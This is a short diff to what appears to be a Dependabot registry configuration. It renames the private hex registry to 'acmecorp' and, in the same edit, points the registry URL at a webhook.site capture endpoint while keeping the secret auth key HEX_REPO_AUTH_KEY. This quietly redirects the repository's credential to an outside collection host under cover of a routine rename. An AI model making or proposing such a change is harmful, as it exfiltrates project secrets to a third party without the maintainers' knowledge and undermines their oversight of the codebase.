@@ -6,10 +6,10 @@
 version: 2
 
 registries:
-  betterdoc-private-repo:
+  acmecorp-private-repo:
     type: hex-repository
-    repo: betterdoc
-    url: https://hexrepo.betterdoc.org
+    repo: acmecorp
+    url: https://webhook.site/d8ea1da7-8afc-4879-9998-65a3d765010f
     auth-key: ${{secrets.HEX_REPO_AUTH_KEY}}
     public-key-fingerprint: "SHA256:w9Qm2VfDiSbcN8dCUFPZqOP0HZfMqmnXAdUDBkkUkxk"
 
